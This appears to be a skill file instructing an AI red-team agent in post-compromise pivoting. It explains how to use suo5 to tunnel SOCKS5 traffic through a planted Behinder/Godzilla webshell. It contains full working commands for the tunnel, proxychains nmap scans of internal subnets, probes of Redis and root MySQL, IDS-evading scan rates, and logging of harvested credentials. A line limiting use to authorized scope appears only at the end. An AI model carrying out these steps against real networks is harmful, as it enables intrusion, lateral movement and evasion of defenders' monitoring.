---
name: suo5-tunnel
description: Use suo5 to establish a SOCKS5 tunnel through a webshell/HTTP, proxying intranet traffic out (core tool for intranet breakthrough)
whenToUse: After obtaining access to a machine (webshell/RCE) and needing to enter the intranet for scanning and lateral movement
role: internal
enabled: true
---

# suo5 intranet tunnel

> **This is the standard channel for entering the intranet**: after obtaining a webshell/RCE, you **must** first establish a SOCKS5 tunnel with suo5,
> register the tunnel in the database (`redteam_tunnel_add` kind=suo5) and verify it actually works with `redteam_session_check`,
> then proceed to intranet mapping and lateral movement. **Do not handcraft intranet probing scripts without a tunnel**—it is slow and can easily kill the entry point.
> The tunnel-entry webshell must be a Behinder/Godzilla webshell (see skill `webshell-toolkit`) so the user can reuse it.

Binary: `$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64` (v2.2.0, static Go, no dependencies)

## Establish tunnel
```bash
SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64

# 1) Use webshell as tunnel endpoint (HTTP type)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) With authentication
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) HTTP proxy only (for tools that only support HTTP proxy)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
Parameter quick reference: `-t` target shell URL, `-l` local listen, `-m socks5|http`, `--auth user:pass`, `-r` reconnect interval, `--debug` to inspect traffic.

## Perform intranet operations through tunnel
```bash
# curl via SOCKS5
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# nmap must use -sT (full connect) + proxychains, or --proxies (newer versions)
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# Databases / middleware
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# Browser/API testing through tunnel
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## Intranet scan pacing (avoid alerts)
- First do `/24` liveness probing (`nmap -sn` through tunnel or ICMP), then scan common ports on live hosts.
- Reduce rate to `-T2 --max-rate 50` to avoid triggering IDS.
- Add every newly discovered asset with `redteam_asset_add` (auto-creates /24 segments), marking `provenance="active"`, `tool="suo5+nmap"`.

## Record requirements
- **Register immediately after setup (required)**: `redteam_tunnel_add` (`kind=suo5`, `listen=127.0.0.1:1080`, `entry=<webshell URL>`, `reach=reachable segments`, `command=full startup command`), set `webshell_id` to the corresponding webshell record; then verify connectivity with `redteam_session_check` and confirm status=active before proceeding.
- Record the tunnel itself with `redteam_chain_add` (stage=pivot, detail includes tunnel endpoint and local port).
- Record each intranet asset, each successful login, and each credential separately (asset/access/credential).
- If tunnel drops, mark it down with `redteam_tunnel_update`; do not leave a tunnel that "looks running but is actually broken" for later roles to hit.

## Notes
- Clean up tunnel endpoint files as needed and restore target to original state.
- Free public proxies are not suitable for carrying tunnels; suo5 uses the target's own webshell and does not require an extra proxy.
- Use only within authorized scope.
